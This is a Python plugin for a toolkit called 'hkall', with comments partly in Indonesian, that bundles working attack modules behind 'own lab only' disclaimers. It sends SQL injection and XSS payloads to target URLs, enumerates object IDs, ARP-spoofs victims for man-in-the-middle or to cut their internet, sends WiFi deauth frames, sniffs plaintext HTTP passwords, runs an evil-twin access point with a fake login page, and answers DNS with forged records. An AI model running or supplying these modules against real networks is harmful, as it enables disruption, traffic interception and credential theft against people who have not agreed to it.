#!/usr/bin/env python3
"""hkall websec plugin — LAB modules. Run against YOUR OWN webapp/device/LAN only.
mitm + dns need root and auto-restore on exit. ddos is a bounded load test."""
import os, re, time, socket, threading, subprocess, sys, signal

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
DATA = os.path.join(ROOT, "data")

# CLI presets from hkall are read via __main__.GINJ (see _ask). None here.
def _ask(prompt, default="", ginj=None):
    if ginj:
        return str(ginj.pop(0))
    # CLI preset queue from hkall main (set by cli_one for -m MODULE presets)
    try:
        import __main__ as _m
        q = getattr(_m, "GINJ", None)
        if q:
            return str(q.pop(0))
    except Exception:
        pass
    try:
        v = input(prompt + " ").strip()
        return v or default
    except (EOFError, KeyboardInterrupt):
        return default

def _save(kind, target, data):
    import sqlite3
    from datetime import datetime
    db = os.path.join(DATA, "rs.db")
    try:
        with sqlite3.connect(db) as c:
            c.execute("CREATE TABLE IF NOT EXISTS rs(kind, target, ts, data)")
            c.execute("INSERT INTO rs VALUES(?,?,?,?)", (kind, target, datetime.now().isoformat(), data))
    except Exception:
        pass

def _http_req(url, method="GET", data=None, headers=None, timeout=5):
    import urllib.request, urllib.parse
    if data is not None and isinstance(data, dict):
        data = urllib.parse.urlencode(data).encode()
    h = {"User-Agent": "hkall-lab"} 
    if headers: h.update(headers)
    req = urllib.request.Request(url, data=data, method=method, headers=h)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read(), dict(r.headers)
    except urllib.error.HTTPError as e:
        # 4xx/5xx are meaningful signals, not connection failures
        return e.code, e.read(), dict(e.headers)
    except Exception as e:
        return None, str(e).encode(), {}

def _banner(t): print(f"\n== {t} ==")

# ---------------------------------------------------------------- sqli
def _inject(payload, url, data):
    """Injeksi payload ke GET param pertama / POST body '{}'."""
    if data:  # POST: ganti {} di body, atau anggap body sebagai key=val via query
        body = data.replace("{}", payload)
        return url, body
    # GET: inject ke param query pertama
    import urllib.parse
    if "?" in url:
        base, q = url.split("?", 1)
        k = q.split("=")[0]
        return base + "?" + k + "=" + urllib.parse.quote(payload), None
    sep = "?" if "?" not in url else "&"
    return url + sep + "q=" + urllib.parse.quote(payload), None

def mod_sqli():
    _banner("SQLi TEST (your own webapp/API; supports POST body)")
    url = _ask("target url (param-based):").strip()
    if not url: print("no url"); return
    method = _ask("method [GET]: ").strip().upper() or "GET"
    payloads = [
        "'", "''", "' OR 1=1--", "' OR '1'='1", "' OR 1=1#", "\" OR 1=1--",
        "1' ORDER BY 1--", "1' ORDER BY 9--", "1 UNION SELECT NULL--",
        "1 UNION SELECT NULL,NULL,NULL--", "'; WAITFOR DELAY '0:0:3'--",
        "1 AND SLEEP(3)--", "1' AND (SELECT 1 FROM (SELECT SLEEP(3))a)--",
        "') OR 1=1--", "1))--", "' OR 1=1 LIMIT 1--",
    ]
    data = None
    if method == "POST":
        body = _ask("POST body (key=val&...):").strip()
        if body:
            data = body
    print(f"testing {method} {url} — classic return-diff + timing probes")
    res, _, _ = _http_req(url, method, data=data)
    issues = []
    seen = set()
    for p in payloads:
        target, body = _inject(p, url, data)
        st = None
        try:
            st, rbody, hd = _http_req(target, method, data=body)
        except Exception:
            st = None
        if st in seen:
            pass
        seen.add(st)
        if res is not None and st is not None and st != res:
            # status different: candidate (verify manually)
            tag = "likely-no" if st in (400, 404) else "check"
            print(f"  [{tag}] {p} -> status {st} vs base {res}")
            issues.append(p)
        if "SLEEP(" in p or "WAITFOR" in p:
            t0 = time.time()
            _http_req(target, method, data=body, timeout=8)
            dt = time.time() - t0
            if dt > 2:
                print(f"  [!] {p} -> {dt:.1f}s (time-based blind)")
                issues.append(p)
    print(f"\nissues: {issues or 'none'}  (verify manually: classic=status/body diff, blind=time delta)")
    _save("sqli", url, f"base={res if res is not None else 'err'} issues={issues}")

# ---------------------------------------------------------------- xss
def mod_xss():
    _banner("XSS CHECK (your own webapp input reflection)")
    url = _ask("target url (with input param, e.g. ?q=):").strip()
    if not url: print("no url"); return
    meth = _ask("method [GET]: ").strip().upper() or "GET"
    data = None
    if meth == "POST":
        body = _ask("POST body (key=val, use {} for inject point):").strip()
        if body: data = body
    test_payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "\"><svg onload=alert(1)>",
        "' onmouseover='alert(1)",
        "<svg/onload=alert(1)>",
        "javascript:alert(1)",
    ]
    import urllib.parse
    print(f"checking reflection of {len(test_payloads)} payloads on {url}")
    reflected = []
    for p in test_payloads:
        target, body = _inject(p, url, data)
        st, body_res, _ = _http_req(target, meth, data=body if body else None)
        s = (body_res or b"").decode(errors="replace")
        if p in s:
            print(f"  [!] reflected unescaped: {p}")
            reflected.append(p)
        elif p.replace("<", "&lt;").replace(">", "&gt;") in s:
            print(f"  [i] escaped (safe): {p}")
    print(f"reflected raw: {reflected or 'none'}")
    _save("xss", url, f"reflected={reflected}")

# ---------------------------------------------------------------- csrf
def mod_csrf():
    _banner("CSRF CHECK (your own webapp)")
    url = _ask("target url (action endpoint):").strip()
    if not url: print("no url"); return
    st, body, hd = _http_req(url, "GET")
    s = body.decode(errors="replace")
    cookies = hd.get("Set-Cookie", "")
    same_site = "samesite" in cookies.lower()
    has_token = bool(re.search(r"csrf_token|_token|authenticity_token", s, re.I))
    print(f"GET {url} -> {st}")
    print(f"  cookie: {'Set-Cookie present' if cookies else 'none'}")
    print(f"  SameSite: {'set (+Lax/Strict safe for state-change)' if same_site else 'MISSING -> vulnerable to cross-site POST'}")
    print(f"  csrf token in body: {'present' if has_token else 'MISSING -> need origin/referer check'}")
    verdict = "hardened" if (same_site and has_token) else "review"
    print(f"  verdict: {verdict}")
    _save("csrf", url, f"code={st} samesite={same_site} token={has_token}")

# ---------------------------------------------------------------- idor
def mod_idor():
    _banner("IDOR TEST (your API — enumerate object IDs, check authz)")
    url = _ask("api url (use ID placeholder like /user/{{id}}):").strip()
    lo, hi = 1, int(_ask("id range [1-5]: ").strip() or "5") + 1
    auth = _ask("auth header (optional, e.g. 'Bearer x'):").strip()
    hd = {"Authorization": auth} if auth else None
    print(f"enumerating IDs {1}-{hi-1} on {url}")
    found = []
    for i in range(lo, hi):
        t = url.replace("{{id}}", str(i))
        st, body, _ = _http_req(t, headers=hd)
        if st and st != 404 and len(body) > 0:
            print(f"  [!] {t} -> {st} len={len(body)}")
            found.append((i, st))
        else:
            print(f"  - {t} -> {st}")
    print(f"accessible ids: {found or 'none'}")
    _save("idor", url, f"found={found}")

# ---------------------------------------------------------------- mitm (ARP relay)
def mod_mitm():
    _banner("MITM LAB (ARP spoof, needs root — auto-restores)")
    if os.geteuid() != 0:
        print("need root (pkg install root-repo root + tsu). abort"); return
    vi = _ask("victim ip (your other device):").strip()
    gw = _ask("gateway ip [192.168.1.1]: ").strip() or "192.168.1.1"
    iface = _ask("interface [wlan0]: ").strip() or "wlan0"
    rng = _ask("run seconds [15]: ").strip() or "15"
    if not vi: print("no victim ip"); return
    try:
        rng = int(rng)
    except ValueError: print("bad seconds"); return
    def mac(ip):
        # returns colon format; normalize to raw hex
        out = subprocess.run(["cat", "/proc/net/arp"], capture_output=True, text=True).stdout
        for line in out.splitlines()[1:]:
            f = line.split()
            if len(f) >= 4 and f[0] == ip: return f[3].replace(":", "")
        return None
    import struct
    import fcntl
    def own_mac(iface):
        # get THIS interface's real MAC (the attacker's own addressing)
        try:
            s0 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            r = fcntl.ioctl(s0.fileno(), 0x8927, struct.pack("256s", iface[:15].encode()))
            return ":".join(f"{b:02x}" for b in r[18:24]).replace(":", "")
        except Exception:
            return None
    print("resolving victim MAC...")
    vmac = mac(vi)
    if not vmac:
        print(f"victim {vi} not in ARP table — ping first"); return
    print(f"victim {vi} @ {':'.join(vmac[i:i+2] for i in range(0,12,2))}") if len(vmac)==12 else print(f"victim {vi} @ {vmac}")
    amac = own_mac(iface) or vmac  # fallback: victim MAC (not ideal, but avoids none)
    if not amac:
        print(f"cannot resolve own MAC on {iface} — check interface name"); return
    print(f"attacker (via {iface}) @ {':'.join(amac[i:i+2] for i in range(0,12,2))}")
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    s.bind((iface, 0))
    gmac = mac(gw) or "ffffffffffff"
    def pkt(claims_mac, claims_ip, op, dst_mac=b"\xff\xff\xff\xff\xff\xff"):
        # ARP frame: src MAC = attacker own MAC (amac); sender = claims_mac@claims_ip
        p = struct.pack("!HHBBH", 1, 0x0800, 6, 4, op)
        p += bytes.fromhex(claims_mac) + socket.inet_aton(claims_ip)
        p += bytes.fromhex(gmac if claims_ip == gw else vmac) + socket.inet_aton(gw if claims_ip == gw else vi)
        return dst_mac + bytes.fromhex(amac) + b"\x08\x06" + p
    # spoof BOTH directions: tell victim that gw is at MY mac; tell gw that vi is at MY mac
    def spoof_once():
        s.send(pkt(amac, gw, 1))   # reply to victim: "gw is amac" (broadcast)
        s.send(pkt(amac, vi, 1))   # reply to gw: "vi is amac" (broadcast)
    def restore():
        # heal both caches with TRUE mapping
        for _ in range(3):
            try:
                s.send(pkt(gmac, gw, 2))   # victim: gw really at gmac
                s.send(pkt(vmac, vi, 2))   # gateway: vi really at vmac
                time.sleep(0.1)
            except Exception: pass
    print(f"spoofing {vi}<->{gw} for {rng}s (ctrl-c to stop early). capturing is passive; run tcpdump/tshark in parallel.")
    t0 = time.time()
    try:
        while time.time() - t0 < rng:
            spoof_once()
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    finally:
        restore()
        s.close()
        print("restored ARP.")

# ---------------------------------------------------------------- netcut (cut internet target)
def mod_netcut():
    _banner("NETCUT-LIKE (kill internet target on same LAN, needs root — auto-restores)")
    if os.geteuid() != 0:
        print("need root (pkg install root-repo root + tsu). abort"); return
    vi = _ask("target ip (your device on same LAN):").strip()
    gw = _ask("gateway ip [192.168.1.1]: ").strip() or "192.168.1.1"
    iface = _ask("interface [wlan0]: ").strip() or "wlan0"
    rng = _ask("cut seconds [10]: ").strip() or "10"
    if not vi: print("no target ip"); return
    if vi == gw:
        print("target == gateway — tidak masuk akal (gw tak bisa dicut begini)."); return
    try:
        rng = int(rng)
    except ValueError: print("bad seconds"); return
    if rng > 120:
        print("cap 120s — edit manual kalau butuh lebih."); rng = 120
    # open raw AF_PACKET socket (needs root). do it before resolving so we bail fast.
    try:
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
        s.bind((iface, 0))
    except OSError as e:
        print(f"raw socket bind {iface} gagal ({e}) — pastikan root + interface benar."); return
    def mac(ip):
        out = subprocess.run(["cat", "/proc/net/arp"], capture_output=True, text=True).stdout
        for line in out.splitlines()[1:]:
            f = line.split()
            if len(f) >= 4 and f[0] == ip: return f[3].replace(":", "")  # strip colons for fromhex
        return None
    print("resolving target MAC...")
    vmac = mac(vi)  # raw hex: "001122334455"
    if not vmac:
        print(f"target {vi} not in ARP table — ping {vi} dulu, atau pastikan aktif di LAN."); return
    print(f"target {vi} @ {':'.join(vmac[i:i+2] for i in range(0,12,2))}")
    gmac_raw = mac(gw)  # raw hex
    if not gmac_raw:
        print(f"gateway {gw} not in ARP table — fallback ff:ff:ff:ff:ff:ff"); gmac_raw = "ffffffffffff"
    DUMMY_MAC = "000000000000"
    import struct as _st
    def arp_frame(dst_hex, src_hex, target_ip, sender_ip, op):
        p = _st.pack("!HHBBH", 1, 0x0800, 6, 4, op)
        p += bytes.fromhex(src_hex) + socket.inet_aton(sender_ip)
        p += bytes.fromhex(dst_hex) + socket.inet_aton(target_ip)
        return b"\xff\xff\xff\xff\xff\xff" + bytes.fromhex(dst_hex) + b"\x08\x06" + p
    def broadcast(pkt): s.send(pkt)
    # cut: victim believes gw is at UNREACHABLE mac -> traffic to gw blackholes
    def cut_once():
        broadcast(arp_frame(DUMMY_MAC, DUMMY_MAC, gw, vi, 2))   # vi: gw <= dummy
        broadcast(arp_frame(DUMMY_MAC, DUMMY_MAC, vi, gw, 2))   # gw: vi  <= dummy
    def restore():
        # correct ARP entries: tell victim "gw at gmac", tell gateway "vi at vmac"
        # arp_frame(dst, src, target_ip, sender_ip, op=2 reply)
        broadcast(arp_frame(vmac, gmac_raw, vi, gw, 2))   # to victim: "gw at gmac" (sender=gmac@gw)
        broadcast(arp_frame(gmac_raw, vmac, gw, vi, 2))   # to gateway: "vi at vmac" (sender=vmac@vi)
    print(f"cutting internet {vi} for {rng}s (arp gw->dummy). ctrl-c = restore segera.")
    t0 = time.time()
    try:
        while time.time() - t0 < rng:
            cut_once()
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    finally:
        restore()
        s.close()
        _save("netcut", vi, f"cut {rng}s gw={gw} restored")
        print("restored ARP — target online kembali.")

# ---------------------------------------------------------------- deauth (kick from WiFi)
def mod_deauth():
    _banner("DEAUTH (kick device dari WiFi — 802.11, perlu monitor mode)")
    if os.geteuid() != 0:
        print("need root. abort"); return
    import subprocess as sp
    ap_mac = _ask("AP bssid (mac router):").strip().lower()
    client = _ask("client mac (target; blank=all):").strip().lower()
    iface = _ask("interface [wlan0]: ").strip() or "wlan0"
    cnt = int(_ask("deauth count [10]: ").strip() or "10")
    if not ap_mac: print("need AP bssid"); return
    # prefer aireplay-ng (reliable) kalau ada
    import shutil as _sh
    if _sh.which("aireplay-ng") is not None:
        cmd = ["aireplay-ng", "-0", str(cnt), "-a", ap_mac]
        if client: cmd += ["-c", client]
        cmd += [iface]
        print("$ " + " ".join(cmd))
        try:
            sp.run(cmd)
        except KeyboardInterrupt:
            pass
        print("deauth selesai.")
        return
    print("aireplay-ng tidak ada — coba raw deauth frame via AF_PACKET (monitor iface).")
    print("pastikan interface monitor: ip link set " + iface + " down && iw dev " + iface + " set type monitor && ip link set " + iface + " up")
    try:
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
    except OSError as e:
        print(f"raw socket gagal ({e}) — pakai aireplay-ng (aircrack-ng)."); return
    try:
        s.bind((iface, 0))
    except OSError as e:
        print(f"bind {iface} gagal ({e}) — sehingga monitor iface."); return
    # 802.11 deauth: type/mgmt (0x00 0x00), flags, duration, da, sa, bssid, seq, reason
    client_raw = client.replace(":", "") if client else ""
    ap_raw = ap_mac.replace(":", "")
    da = bytes.fromhex(client_raw) if client_raw else b"\xff\xff\xff\xff\xff\xff"
    sa = bytes.fromhex(ap_raw)
    bssid = sa
    frame = b"\x00\x00\x00\x00\xff" + da + sa + bssid + b"\x00\x00\x07\x00"
    print(f"sending {cnt} deauth frames (da={':'.join(client_raw[i:i+2] for i in range(0,12,2)) if client_raw else 'broadcast'}, sa={ap_mac})...")
    for _ in range(cnt):
        try:
            s.send(frame)
        except OSError as e:
            print(f"frame err: {e}"); break
        import time as _t; _t.sleep(0.05)
    s.close()
    print("deauth sent.")

# ---------------------------------------------------------------- sniff (passive HTTP creds / nearby probe)
def mod_sniff():
    _banner("SNIFF (passive capture — HTTP plaintext creds + probe request nearby)")
    if os.geteuid() != 0:
        print("need root. abort"); return
    import struct as _st
    iface = _ask("interface [wlan0]: ").strip() or "wlan0"
    secs = int(_ask("capture seconds [10]: ").strip() or "10")
    mode = _ask("target: [c]reds HTTP  [p]robe nearby: ").strip().lower() or "c"
    print(f"capturing on {iface} {secs}s (raw AF_PACKET)...")
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
    try:
        s.bind((iface, 0))
    except OSError as e:
        print(f"bind gagal ({e})"); return
    s.settimeout(1)
    import re as _re
    stop = [time.time() + secs]
    hits = []
    try:
        while time.time() < stop[0]:
            try:
                pkt, _ = s.recvfrom(65535)
            except socket.timeout:
                continue
            except OSError:
                break
            if mode == "p":
                # 802.11 probe request: subtype 0x04 in frame control
                if len(pkt) > 30 and (pkt[0] & 0xfc) == 0x40:
                    # probe req body: SSID after fixed header (24 bytes) + tags
                    try:
                        ssid = pkt[24:].split(b"\x00", 1)[0].decode(errors="ignore")
                        if ssid.isprintable() and ssid:
                            hits.append(("probe", ssid, pkt[10:16].hex(":")))
                            print(f"[probe] {ssid} src={pkt[10:16].hex(':')}")
                    except Exception:
                        pass
            else:
                # grab TCP payload on port 80 with plaintext creds patterns
                eth = pkt[:14]
                if len(pkt) <= 14: continue
                ethertype = _st.unpack("!H", eth[12:14])[0]
                if ethertype != 0x0800: continue
                ip = pkt[14:]
                if len(ip) < 20: continue
                proto = ip[9]
                ihl = (ip[0] & 0x0f) * 4
                if proto != 6 or len(ip) < ihl + 20: continue
                tcp = ip[ihl:]
                sport, dport = _st.unpack("!HH", tcp[0:4])
                data = tcp[(tcp[12] >> 4) * 4:]
                if dport == 80 or sport == 80:
                    body = data.decode(errors="ignore")
                    m = _re.search(r"(?i)(password|passwd|user(name)?|login)(=|\"|:)([^\s&\"']+)", body)
                    if m:
                        line = body[:80].replace("\n", " ")
                        key = (m.group(0),)
                        if key not in hits:
                            hits.append(key)
                            print(f"[cred] {dport==80 and 'C->S' or 'S->C'} {sport}:{dport} {line}")
    except KeyboardInterrupt:
        pass
    s.close()
    print(f"done — {len(hits)} hit(s)")
    _save("sniff", iface, f"mode={mode} hits={hits}")

# ---------------------------------------------------------------- evil twin (clone AP + landing)
def mod_eviltwin():
    _banner("EVIL TWIN (clone AP — hostapd + DNS landing, root, Linux/termux-root)")
    if os.geteuid() != 0:
        print("need root. abort"); return
    import shutil as _sh
    for b in ("hostapd", "dnsmasq"):
        if not _sh.which(b):
            print(f"{b} tidak ada — pkg install {b}  (termux: root-repo)."); return
    ssid = _ask("SSID (nama AP asli yang mau di-clone):").strip()
    iface = _ask("interface monitoring [wlan0]: ").strip() or "wlan0"
    gw_ip = _ask("gateway ip untuk AP palsu [10.0.0.1]: ").strip() or "10.0.0.1"
    chan = _ask("channel [6]: ").strip() or "6"
    if not ssid: print("need ssid"); return
    import tempfile as _tf
    d = _tf.mkdtemp(prefix="eviltwin_")
    hostapd_cfg = os.path.join(d, "hostapd.conf")
    with open(hostapd_cfg, "w") as f:
        f.write(f"interface={iface}\n")
        f.write(f"ssid={ssid}\n")
        f.write("hw_mode=g\n")
        f.write(f"channel={chan}\n")
        f.write("wpa=2\nwpa_passphrase=hkalltest\nwpa_key_mgmt=WPA-PSK\n")
    dnsmasq_cfg = os.path.join(d, "dnsmasq.conf")
    with open(dnsmasq_cfg, "w") as f:
        f.write(f"interface={iface}\n")
        f.write(f"dhcp-range=10.0.0.10,10.0.0.50,12h\n")
        f.write(f"address=/#/{gw_ip}\n")
    landing = os.path.join(d, "index.html")
    with open(landing, "w") as f:
        f.write("<html><body><h1>WiFi Config Required</h1><form method=post>"
                "<input name=user placeholder=username><br><input name=pass type=password>"
                "<br><button>Connect</button></form></body></html>")
    print(f"evil twin '{ssid}' on {iface} (open + WPA2 'hkalltest'). Landing: http://{gw_ip}")
    print(f"configs di {d} — ctrl-c stop, scan session destroy")
    procs = []
    try:
        import http.server as _hs
        os.chdir(d)
        handler = _hs.SimpleHTTPRequestHandler
        httpd = _hs.HTTPServer((gw_ip, 80), handler)
        import threading as _th
        _th.Thread(target=httpd.serve_forever, daemon=True).start()
        procs.append(subprocess.Popen(["dnsmasq", "-C", dnsmasq_cfg, "--no-daemon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
        procs.append(subprocess.Popen(["hostapd", hostapd_cfg], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
        print("AP palsu + dnsmasq + landing aktif. Access log di httpd (lihat terminal).")
        while True:
            import time as _t
            _t.sleep(60)
    except KeyboardInterrupt:
        pass
    finally:
        for p in procs:
            try: p.terminate()
            except Exception: pass
        try: httpd.shutdown()
        except Exception: pass
        print("evil twin stopped.")

# ---------------------------------------------------------------- dns spoof
def mod_dnsspoof():
    _banner("DNS SPOOF LAB (needs root — your own DNS server for testing)")
    if os.geteuid() != 0:
        print("need root. abort"); return
    port = int(_ask("listen port [53]: ").strip() or "53")
    dom = _ask("domain to answer (e.g. test.lab):").strip().lower()
    ip = _ask("answer ip (e.g. 127.0.0.1):").strip()
    if not dom or not ip: print("domain+ip required"); return
    ipb = bytes(int(x) for x in ip.split("."))
    stop = [False]
    def serve():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.bind(("", port))
        s.settimeout(1)
        print(f"fake DNS on :{port} — answering {dom} -> {ip} (ctrl-c stops)")
        while not stop[0]:
            try:
                data, addr = s.recvfrom(512)
            except socket.timeout:
                continue
            except OSError:
                return
            # mirror query id + qname, fabricate answer
            qid = data[:2]
            # cut the query section same length, set flags RA+RD, one answer
            try:
                qlen = data.find(b"\x00") + 1
                qfull = data[: qlen + 4]
                resp = qid + b"\x81\x80" + data[4:6] + b"\x00\x01" + b"\x00\x00\x00\x00"
                resp += qfull
                resp += b"\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04" + ipb
                s.sendto(resp, addr)
            except Exception:
                pass
    t = threading.Thread(target=serve, daemon=True)
    t.start()
    try:
        while t.is_alive():
            time.sleep(1)
    except KeyboardInterrupt:
        stop[0] = True
    print("fake DNS stopped.")
    _save("dns", dom, f"{dom}->{ip}")

# ---------------------------------------------------------------- ddos (bounded load test)
def mod_ddos():
    _banner("LOAD TEST (your own server — bounded, rate-limited)")
    url = _ask("target url (your own host):").strip()
    if not url: print("no url"); return
    conn = int(_ask("concurrency [20]: ").strip() or "20")
    dur = int(_ask("duration seconds [10]: ").strip() or "10")
    method = _ask("method [GET]: ").strip().upper() or "GET"
    conn = min(conn, 200); dur = min(dur, 60)
    print(f"{method} {url} — {conn} conns, {dur}s, capped 200/60")
    stat = {"ok": 0, "err": 0, "bytes": 0, "reqs": [0]}
    lock = threading.Lock()
    t0 = time.time()
    def worker():
        while time.time() - t0 < dur and not (time.time() - t0 > dur + 1):
            st, body, _ = _http_req(url, method)
            with lock:
                if st: stat["ok"] += 1; stat["bytes"] += len(body)
                else: stat["err"] += 1
                stat["reqs"][0] += 1
    ts = [threading.Thread(target=worker) for _ in range(conn)]
    for t in ts: t.start()
    for t in ts: t.join()
    dt = time.time() - t0 or 1
    print(f"done in {dt:.1f}s: {stat['ok']} ok, {stat['err']} err, {stat['bytes']}B, {stat['reqs'][0]/dt:.0f} req/s")
    _save("ddos", url, f"{stat['reqs'][0]}reqs {dt:.0f}s {stat['bytes']}B err={stat['err']}")

def _which(name):
    import shutil
    return shutil.which(name)

def _ecosystem():
    """Deteksi tools eksternal terpasang di device (untuk menu + dual-path)."""
    found = {}
    for name in ("sqlmap", "bettercap", "ettercap", "dnschef", "dnsspoof", "ffuf", "feroxbuster", "ab", "wrk", "vegeta", "arpspoof", "tshark", "tcpdump"):
        found[name] = _which(name)
    return found

def mod_websec():
    """Menu terpadu: pilih kategori -> pilih tool -> input -> auto. Dual-path."""
    _banner("WEB SEC ORCHESTRATOR (lab menu)")
    if not sys.stdin.isatty():
        print("websec is interactive; run from a tty or use per-module CLI (-m sqli etc). exiting.")
        return
    ec = _ecosystem()
    have = [k for k, v in ec.items() if v]
    print("detected tools: " + (", ".join(have) if have else "none external — internal fallbacks will run"))
    print("\n1. web vuln   (sqli, xss, csrf, idor)")
    print("2. network    (mitm, dns spoof — root)")
    print("3. load test  (ddos bounded)")
    cat = input("category [1]: ").strip() or "1"
    if cat == "1":
        print("\na. sqli   b. xss   c. csrf   d. idor")
        print("   (auto-chain a->d on one target: enter 'a,b,c,d' or just 'auto')")
        sel = input("select [auto]: ").strip() or "auto"
        url = input("target url (device own): ").strip()
        if not url: print("no url"); return
        order = {"a": mod_sqli, "b": mod_xss, "c": mod_csrf, "d": mod_idor}
        if sel == "auto":
            # pass the chosen url to each module via GINJ so they don't re-prompt
            import __main__
            orig = list(__main__.GINJ)
            for fn in (mod_sqli, mod_xss, mod_csrf, mod_idor):
                __main__.GINJ = [url]
                fn()
            __main__.GINJ = orig
        else:
            import __main__
            orig = list(__main__.GINJ)
            for ch in sel.split(","):
                ch = ch.strip()
                if ch in order:
                    __main__.GINJ = [url]
                    order[ch]()
            __main__.GINJ = orig
    elif cat == "2":
        print("\na. mitm (arp spoof)   b. dnsspoof   c. netcut (cut internet)")
        print("   d. deauth (kick wifi) e. sniff   f. eviltwin")
        sel = input("select [a]: ").strip() or "a"
        if sel == "b": mod_dnsspoof()
        elif sel == "c": mod_netcut()
        elif sel == "d": mod_deauth()
        elif sel == "e": mod_sniff()
        elif sel == "f": mod_eviltwin()
        else: mod_mitm()
    else:
        mod_ddos()

PLUGIN = {
    "sqli": ("SQLi tester (lab)", mod_sqli, True),
    "xss": ("XSS reflection check (lab)", mod_xss, True),
    "csrf": ("CSRF check (lab)", mod_csrf, True),
    "idor": ("IDOR enumeration (lab)", mod_idor, True),
    "mitm": ("ARP MITM lab (root)", mod_mitm, True),
    "netcut": ("Cut internet target (root, netcut-like)", mod_netcut, True),
    "deauth": ("Deauth/kick dari WiFi (root, monitor)", mod_deauth, True),
    "sniff": ("Sniff HTTP creds + probe nearby (root)", mod_sniff, True),
    "eviltwin": ("Evil twin AP (root, hostapd+dnsmasq)", mod_eviltwin, True),
    "dnsspoof": ("fake DNS lab (root)", mod_dnsspoof, True),
    "ddos": ("Load test (bounded, own server)", mod_ddos, True),
    "websec": ("Orchestrator menu (lab)", mod_websec, True),
}
